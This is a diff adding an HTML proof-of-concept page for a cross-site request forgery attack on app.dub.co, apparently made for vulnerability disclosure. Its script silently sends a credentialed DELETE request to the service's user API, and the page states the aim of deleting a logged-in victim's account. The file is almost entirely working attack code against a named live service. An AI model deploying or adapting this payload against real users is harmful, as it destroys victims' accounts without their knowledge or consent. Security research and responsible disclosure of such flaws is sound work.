@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF PoC - Delete User</title>
+  </head>
+  <body>
+    <h1>CSRF PoC - Delete Account</h1>
+    <p>If the victim is logged in to <code>app.dub.co</code>, this will try to delete their account silently.</p>
+
+    <script>
+      fetch("https://app.dub.co/api/user", {
+        method: "DELETE",
+        credentials: "include"
+      })
+      .then(res => {
+        alert("Response status: " + res.status);
+      })
+      .catch(err => {
+        alert("Request failed: " + err);
+      });
+    </script>
+  </body>
+</html>
